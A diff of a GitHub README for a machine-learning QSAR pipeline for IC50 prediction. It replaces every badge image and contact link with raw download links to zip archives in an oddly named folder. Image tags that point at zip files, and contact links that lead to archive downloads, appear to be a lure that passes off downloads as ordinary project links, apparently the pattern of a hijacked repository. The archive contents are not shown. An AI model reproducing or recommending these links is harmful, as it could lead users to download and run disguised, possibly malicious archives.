@@ -2,9 +2,9 @@
 <p align="center">A Step-by-Step Pipeline for Predicting IC50 & Structural Optimization Using Atom-Based QSAR</p>
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
-  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
-  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
 </p>
 
 > ⚠️ **Disclaimer:** Dataset not shared due to  confidentiality. Results are reproducible with custom data.
@@ -153,11 +153,11 @@ Models were assessed based on:
 I'm open to collaboration, freelance projects, or discussing QSAR/bioinformatics-related work.
 
 <p align="left">
-  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" target="_blank">
-    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
+  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
   </a>
-  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip">
-    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
+  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip">
+    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/QSA-Analysis-Machine-based-learning-3.3.zip" />
   </a>
 </p>
 
